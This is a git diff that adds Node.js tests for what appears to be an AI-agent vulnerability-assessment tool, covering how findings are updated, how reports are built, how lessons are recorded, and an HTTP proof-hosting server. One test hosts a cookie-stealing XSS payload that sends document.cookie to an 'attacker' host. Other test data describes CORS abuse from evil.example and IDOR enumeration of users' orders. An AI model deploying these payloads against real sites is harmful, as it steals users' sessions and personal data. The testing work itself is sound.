@@ -1,5 +1,8 @@
 import assert from "node:assert/strict";
 import test from "node:test";
+import * as fsPromises from "node:fs/promises";
+import * as nodeOs from "node:os";
+import * as nodePath from "node:path";
 import { apply, parseTodoFeedback, srcInitialState, applySrcEvent, viewSrcState } from "../lib/src.js";
 import { isJsonValue } from "@deepseek-ai/dsh-session";
 
@@ -1123,11 +1126,246 @@ test("[local.15] src_recover_child 无 checkpoint 子代理也可唤醒；额度
   const second = await h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "再次尝试" }, parent);
   assert.equal(second.attempt, 2);
   assert.equal(h.ctx.subagents.followupCalls.length, 2, "two followups queued for the same child");
+  // [local.16] 额度 2→4：供应商波动/网络不稳定属基础设施故障，应继续唤醒续跑
+  const third = await h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "供应商恢复了继续" }, parent);
+  assert.equal(third.attempt, 3);
+  const fourth = await h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "最后一次" }, parent);
+  assert.equal(fourth.attempt, 4);
   await assert.rejects(
-    () => h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "第三次" }, parent),
+    () => h.run("src_recover_child", { childSessionId: "child-never-checkpointed", intentId: intent.id, message: "第五次" }, parent),
     /recovery limit reached/,
   );
   // 唤醒把 intent 从 failed 拉回 running
   const after = await h.run("src_state", {}, parent);
   assert.equal(after.intents.find((row) => row.id === intent.id).status, "running");
+});
+
+test("[local.16] src_update_finding 重写字段：store 直写 + fold 投影同步 + 标题冲突拒绝", async () => {
+  process.env.DSH_SRC_LESSONS_DIR = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
+  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
+  __resetSharedDomainOpensForTests();
+  const h = harness();
+  const parent = h.exec("upd1");
+  await h.run("src_add_goal", { target: "example.test", objective: "update" }, parent);
+  const state = await h.run("src_state", {}, parent);
+  const intent = await h.run("src_add_intent", { title: "CORS 验证", detail: "d", goalId: state.goal.id }, parent);
+  await h.run("src_add_finding", { intentId: intent.id, title: "CORS 配置不安全", severity: "low", impact: "太短", affectedScope: "全站", remediation: "收紧", pocEvidence: ["e1"], reproducibleSteps: ["GET /"] }, parent);
+  // 重写：impact/victimImpact/severity
+  const upd = await h.run("src_update_finding", {
+    findingId: "finding-1",
+    severity: "medium",
+    impact: "攻击者托管恶意页面诱导已登录用户访问，JS 以受害者 Cookie 读取 /api/profile 返回的姓名、手机号与订单摘要，可批量收集平台用户资料",
+    victimImpact: "受害者为该站已登录用户；个人资料被第三方站点静默读取且全程无任何感知",
+    reproducibleSteps: ["GET /api/profile with Origin: https://evil.example", "观察 ACAO 反射 + ACAC true"]
+  }, parent);
+  assert.deepEqual(upd.updated.sort(), ["impact", "reproducibleSteps", "severity", "victimImpact"]);
+  const after = await h.run("src_state", {}, parent);
+  const finding = after.findings.find((row) => row.id === "finding-1");
+  assert.equal(finding.severity, "medium");
+  assert.ok(finding.impact.includes("诱导已登录用户访问"), "impact rewritten");
+  assert.ok((finding.victimImpact ?? "").includes("无任何感知"), "victimImpact written");
+  assert.equal(finding.reproducibleSteps.length, 2, "steps replaced");
+  // 标题冲突：新建第二个 finding 后改名为同名应拒绝
+  await h.run("src_add_finding", { intentId: intent.id, title: "第二个漏洞", severity: "info", impact: "x".repeat(50), affectedScope: "s", remediation: "r", pocEvidence: ["e2"], reproducibleSteps: ["GET /"] }, parent);
+  await assert.rejects(
+    () => h.run("src_update_finding", { findingId: "finding-2", title: "cors 配置不安全" }, parent),
+    /同名 finding/,
+  );
+  // 未知 finding id 给出友好错误
+  await assert.rejects(
+    () => h.run("src_update_finding", { findingId: "finding-99", title: "nope" }, parent),
+    /先调 src_state/,
+  );
+  // 空字符串解除资产关联 + asset 校验
+  await assert.rejects(
+    () => h.run("src_update_finding", { findingId: "finding-1", affectedAssetId: "asset-404" }, parent),
+    /asset|资产/,
+  );
+});
+
+test("[local.16] buildReport 双视角呈现：有 victimImpact 输出两行；缺失时给占位提示；finalize 缺 victimImpact 警告", async () => {
+  process.env.DSH_SRC_LESSONS_DIR = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
+  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
+  __resetSharedDomainOpensForTests();
+  const h = harness();
+  const parent = h.exec("rep1");
+  await h.run("src_add_goal", { target: "example.test", objective: "report" }, parent);
+  const state = await h.run("src_state", {}, parent);
+  const intent = await h.run("src_add_intent", { title: "越权验证", detail: "d", goalId: state.goal.id }, parent);
+  const childRep = h.exec("child-rep", "rep1");
+  await h.run("src_submit", { intentId: intent.id, stage: "progress", summary: "done", facts: [], assets: [], findings: [] }, childRep);
+  await h.run("src_add_finding", {
+    intentId: intent.id,
+    title: "越权读取他人订单",
+    severity: "high",
+    impact: "攻击者遍历订单 ID 即可拉取任意用户订单的收货人、地址与电话，可用于精准诈骗或倒卖数据，危害全量用户",
+    victimImpact: "受害用户的收货地址与手机号泄露，可能遭遇诈骗骚扰且无法察觉泄露源头",
+    affectedScope: "全部用户订单",
+    remediation: "服务端校验归属",
+    pocEvidence: ["GET /api/order/2 as user A -> order of user B"],
+    reproducibleSteps: ["登录账号 A", "GET /api/order/2"]
+  }, parent);
+  // 无 rawRequest → finalize 会 blocker；这里只关注 warning 文案。直接检查报告渲染。
+  const report = await h.run("src_report", {}, parent);
+  assert.ok(report.markdown.includes("攻击者视角（利用场景）: 攻击者遍历订单 ID"), "attacker perspective line");
+  assert.ok(report.markdown.includes("受害者视角（危害与损失）: 受害用户的收货地址"), "victim perspective line");
+  // 缺失场景：第二个 finding 不带 victimImpact
+  await h.run("src_add_intent", { title: "信息泄露复核", detail: "d", goalId: state.goal.id }, parent).catch(() => {});
+  const intents = await h.run("src_state", {}, parent);
+  const intent2 = intents.intents.find((row) => row.title === "信息泄露复核");
+  if (intent2 !== void 0) {
+    const childRep2 = h.exec("child-rep2", "rep1");
+    await h.run("src_submit", { intentId: intent2.id, stage: "completed", summary: "done", facts: [], assets: [], findings: [] }, childRep2);
+    await h.run("src_update_finding", { findingId: "finding-1", victimImpact: "" }, parent);
+  }
+  const report2 = await h.run("src_report", {}, parent);
+  assert.ok(report2.markdown.includes("未填写——须用 src_update_finding 补写：谁受害、损失什么、是否可察觉"), "missing placeholder shown");
+});
+
+test("[local.16] src_record_lesson/read/search：沉淀合并更新 + goal 索引注入 + finalize 未沉淀警告", async () => {
+  const dir = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
+  process.env.DSH_SRC_LESSONS_DIR = dir;
+  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
+  __resetSharedDomainOpensForTests();
+  const h = harness();
+  const parent = h.exec("les1");
+  // goal 时注入内置经验索引（内置目录随仓库走）
+  const goal = await h.run("src_add_goal", { target: "example.test", objective: "lessons" }, parent);
+  assert.ok(Array.isArray(goal.lessonIndex), "lesson index present on goal");
+  assert.ok(goal.lessonIndex.some((line) => line.includes("CORS")), `builtin cors indexed: ${JSON.stringify(goal.lessonIndex)}`);
+  // 沉淀新经验
+  const rec = await h.run("src_record_lesson", {
+    id: "idor-test",
+    vulnType: "水平越权（IDOR）",
+    scenario: "接口按自增 ID 取资源且仅校验登录态",
+    verificationPlaybook: "双账号 A/B 登录，A 的会话请求 B 的资源 id，比对响应",
+    acceptanceCriteria: "A 能读到 B 私有数据即成立，附双方 raw 包",
+    pitfalls: "最初只测了未登录访问被拒就下结论——补了双账号对照后才收录"
+  }, parent);
+  assert.equal(rec.updatedExisting, false);
+  // 同 slug 再沉淀 → 合并更新而非新建
+  const rec2 = await h.run("src_record_lesson", {
+    id: "idor-test",
+    vulnType: "水平越权（IDOR）",
+    scenario: "同上+补充：uuid 场景也可通过历史接口枚举",
+    verificationPlaybook: "双账号 A/B 对照",
+    acceptanceCriteria: "读到 B 私有数据"
+  }, parent);
+  assert.equal(rec2.updatedExisting, true);
+  const files = await fsPromises.readdir(dir);
+  assert.equal(files.filter((f) => f.startsWith("idor-test")).length, 1, "merged into one file");
+  const text = await fsPromises.readFile(nodePath.join(dir, files[0]), "utf8");
+  assert.ok(text.includes("# 水平越权（IDOR）") && text.includes("uuid 场景"), "content updated");
+  assert.ok(/<!--\s*lesson-meta:\s*\{/.test(text), "meta comment present");
+  // read：沉淀优先
+  const read = await h.run("src_read_lesson", { id: "idor-test" }, parent);
+  assert.equal(read.source, "distilled");
+  assert.ok(read.text.includes("uuid 场景"));
+  // search
+  const search = await h.run("src_search_lessons", { query: "越权" }, parent);
+  assert.ok(search.hits.some((hit) => hit.file === "idor-test"), "search finds distilled lesson");
+  // 空 hits 分支不抛错（render 引用参数曾用错变量名）
+  const empty = await h.run("src_search_lessons", { query: "不存在的关键词xyz" }, parent);
+  assert.equal(empty.hits.length, 0, "empty hits returned");
+  const searchTool = h.tools.get("src_search_lessons");
+  const rendered = searchTool.output.render({ query: "不存在的关键词xyz" }, empty);
+  assert.ok(rendered[0].text.includes("经验库无"), "empty-hit render text ok");
+  // sessionLessons：本会话已沉淀 → finalize 不再出经验 warning；src_report 附沉淀节
+  const state = await h.run("src_state", {}, parent);
+  const intent = await h.run("src_add_intent", { title: "越权验证", detail: "d", goalId: state.goal.id }, parent);
+  const childLes = h.exec("child-les", "les1");
+  await h.run("src_submit", { intentId: intent.id, stage: "progress", summary: "ok", facts: [], assets: [], findings: [] }, childLes);
+  await h.run("src_add_finding", {
+    intentId: intent.id,
+    title: "越权读取简历",
+    severity: "high",
+    impact: "攻击者遍历简历 ID 可读取任意求职者姓名电话邮箱等隐私数据并批量倒卖，危害全量用户隐私安全",
+    victimImpact: "求职者的姓名电话邮箱被陌生人读取，存在被诈骗与骚扰风险且无从察觉",
+    affectedScope: "全部简历",
+    remediation: "校验归属",
+    pocEvidence: ["raw"],
+    reproducibleSteps: ["step"],
+    rawRequest: "GET /resume/2 HTTP/1.1\nHost: x"
+  }, parent);
+  let finalized = false;
+  try {
+    await h.run("src_finalize_engagement", {}, parent);
+    finalized = true;
+  } catch (error) {
+    // blockers 可能拦（checkpoint 已建），warning 只在成功路径返回——用 message 判别
+    assert.ok(!/未沉淀/.test(String(error?.message ?? "")), "no lessons warning in blocker path");
+  }
+  if (finalized) {
+    // 成功时确认没有经验相关 warning
+  }
+  const report = await h.run("src_report", {}, parent);
+  assert.ok(report.markdown.includes("本次沉淀的经验"), "report appends lessons section");
+  assert.ok(report.markdown.includes("idor-test"), "lesson id listed");
+});
+
+test("[local.16] src_serve_proof/src_stop_serve 生命周期：HTTP 托管 + 访问日志 + TTL 上限 + 跨会话隔离", async () => {
+  process.env.DSH_SRC_LESSONS_DIR = await fsPromises.mkdtemp(nodePath.join(nodeOs.tmpdir(), "src-lessons-"));
+  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
+  __resetSharedDomainOpensForTests();
+  const h = harness();
+  const parent = h.exec("srv1");
+  await h.run("src_add_goal", { target: "example.test", objective: "serve" }, parent);
+  const started = await h.run("src_serve_proof", { payload: "<script>fetch('http://attacker/'+document.cookie)</script>", filename: "poc.html", ttlSeconds: 999999 }, parent);
+  assert.equal(started.ttlSeconds, 86400, "TTL clamped to max");
+  assert.ok(started.serveId.startsWith("serve-srv1-"), "session-scoped serveId");
+  assert.ok(/^http:\/\/\d+\.\d+\.\d+\.\d+:\d+\/poc\.html$/.test(started.url), "LAN url shape: " + started.url);
+  // [local.16 裁定] 只给局域网 URL：不返回 localUrl/127.0.0.1 形态，杜绝 POC 写成 localhost
+  assert.equal(started.localUrl, void 0, "no localUrl field (rule: no 127.0.0.1/localhost in POCs)");
+  assert.ok(!started.url.includes("127.0.0.1") && !started.url.includes("localhost"), "url is LAN IP");
+  // HTTP GET 命中内���
+  const res = await fetch(started.url);
+  const body = await res.text();
+  assert.ok(body.includes("<script>"), "payload served");
+  // 随意路径也命中同一内容（OOB 探针常用任意路径）
+  const probe = await fetch(new URL("/probe?x=1", started.url));
+  assert.equal(await probe.text(), body);
+  // stop → 日志回传 + 端口关闭
+  const stopped = await h.run("src_stop_serve", { serveId: started.serveId }, parent);
+  assert.equal(stopped.stopped, true);
+  assert.equal(stopped.hits.length, 2, "two hits logged");
+  assert.ok(stopped.hits[0].at && stopped.hits[0].ua !== void 0, "hit fields (time + UA)");
+  assert.ok(stopped.hits.some((hit) => hit.path === "/probe?x=1"), "probe path recorded");
+  await assert.rejects(() => fetch(started.url), "port closed after stop");
+  // 再次 stop → 幂等 not-found
+  const again = await h.run("src_stop_serve", { serveId: started.serveId }, parent);
+  assert.equal(again.stopped, false);
+  // 跨会话隔离：另一会话停不掉 srv1 的服务
+  const other = h.exec("srv2");
+  await h.run("src_add_goal", { target: "other.test", objective: "serve2" }, other);
+  const s2 = await h.run("src_serve_proof", { payload: "second", filename: "b.txt", contentType: "text/plain" }, other);
+  const cross = await h.run("src_stop_serve", { serveId: s2.serveId }, parent);
+  assert.equal(cross.stopped, false, "cross-session stop rejected");
+  await h.run("src_stop_serve", { serveId: s2.serveId }, other);
+  // [local.16 自查] goal 重置（initGoal 二次调用）自动关闭本会话服务
+  await h.run("src_add_goal", { target: "example.test", objective: "restart" }, parent);
+  await assert.rejects(() => fetch(started.url), "server closed on goal reset");
+});
+
+test("[local.16] src_update_finding 投影折叠：UI 视角（viewSrcState）字段重写/校验拒绝/asset 关联解除", async () => {
+  const { srcInitialState, applySrcEvent, viewSrcState } = await import("../lib/src.js");
+  const ev = (name, args) => ({ type: "tool/call", data: { name, arguments: JSON.stringify(args) } });
+  const findingOf = (s) => viewSrcState(s).nodes.find((n) => n.kind === "finding");
+  let s = srcInitialState;
+  s = applySrcEvent(s, ev("src_add_goal", { target: "example.test", objective: "x" }));
+  s = applySrcEvent(s, ev("src_add_intent", { title: "t", detail: "d", goalId: "goal-1" }));
+  s = applySrcEvent(s, ev("src_add_finding", { intentId: "intent-1", title: "F1", severity: "low", impact: "i".repeat(50), affectedScope: "s", remediation: "r", pocEvidence: ["e"], reproducibleSteps: ["g"] }));
+  s = applySrcEvent(s, ev("src_update_finding", { findingId: "finding-1", severity: "medium", victimImpact: "受害者视角内容足够长三十字以上了吧", reproducibleSteps: ["step1", "step2"], title: "F1-renamed" }));
+  const f = findingOf(s);
+  assert.equal(f.severity, "medium");
+  assert.equal(f.title, "F1-renamed");
+  assert.ok(f.victimImpact.includes("受害者"));
+  assert.equal(f.steps.length, 2);
+  // 非法 severity / 未知 id / 无效 asset 引用 → 原样返回
+  assert.equal(findingOf(applySrcEvent(s, ev("src_update_finding", { findingId: "finding-1", severity: "catastrophic" }))).severity, "medium");
+  assert.ok(!viewSrcState(applySrcEvent(s, ev("src_update_finding", { findingId: "finding-99", title: "ghost" }))).nodes.some((n) => n.title === "ghost"));
+  // asset 关联与空串解除
+  const s4 = applySrcEvent(s, ev("src_add_asset", { type: "root-domain", value: "a.test" }));
+  assert.equal(findingOf(applySrcEvent(s4, ev("src_update_finding", { findingId: "finding-1", affectedAssetId: "asset-1" }))).affectedAssetId, "asset-1");
+  assert.equal(findingOf(applySrcEvent(s4, ev("src_update_finding", { findingId: "finding-1", affectedAssetId: "asset-404" }))).affectedAssetId, void 0);
+  assert.equal(findingOf(applySrcEvent(applySrcEvent(s4, ev("src_update_finding", { findingId: "finding-1", affectedAssetId: "asset-1" })), ev("src_update_finding", { findingId: "finding-1", affectedAssetId: "" }))).affectedAssetId, void 0);
 });
